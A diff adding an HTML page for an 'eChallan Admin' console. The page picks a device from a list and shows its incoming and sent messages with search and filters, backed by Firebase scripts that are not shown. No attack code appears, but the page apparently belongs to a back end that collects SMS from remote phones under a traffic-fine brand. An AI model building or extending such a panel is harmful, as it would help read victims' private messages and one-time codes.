@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Messages - eChallan Admin</title>
+  <link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+  <div class="app-header">
+    <div>
+      <h2>📨 ALL MESSAGES</h2>
+      <div class="user-info" id="userEmail">...</div>
+    </div>
+    <button class="btn-logout" onclick="location.href='dashboard.html'">Back</button>
+  </div>
+
+  <div class="container">
+    <!-- Device Selector -->
+    <div class="section-card" style="background:linear-gradient(145deg,#a01818,#5c0000);">
+      <label style="color:#ffd700;font-size:12px;font-weight:800;letter-spacing:0.5px;">SELECT DEVICE:</label>
+      <select id="deviceSelect" onchange="onDeviceChange()" style="width:100%;padding:12px;border-radius:10px;border:none;margin-top:8px;font-size:14px;font-weight:700;background:#fff;">
+        <option value="">-- Loading devices --</option>
+      </select>
+    </div>
+
+    <!-- Filter Tabs -->
+    <div class="filter-tabs">
+      <button class="active" onclick="setFilter('all', this)">ALL</button>
+      <button onclick="setFilter('incoming', this)">INCOMING</button>
+      <button onclick="setFilter('sent', this)">SENT</button>
+    </div>
+
+    <!-- Search Bar -->
+    <div class="input-group" style="margin-bottom:14px;">
+      <input type="text" id="searchInput" placeholder="🔍 Search by number or body..." oninput="filterMessages()" style="background:#fff;color:#333;border-radius:14px;padding:12px 16px;font-size:13px;">
+    </div>
+
+    <!-- Message Count -->
+    <div style="color:rgba(255,255,255,0.8);font-size:12px;font-weight:700;margin-bottom:10px;" id="msgCount">0 messages</div>
+
+    <!-- Message List -->
+    <div id="messageList">
+      <div class="loading">Select a device to load messages...</div>
+    </div>
+  </div>
+
+  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-auth-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+  <script src="js/firebase-config.js"></script>
+  <script src="js/messages.js"></script>
+</body>
+</html>
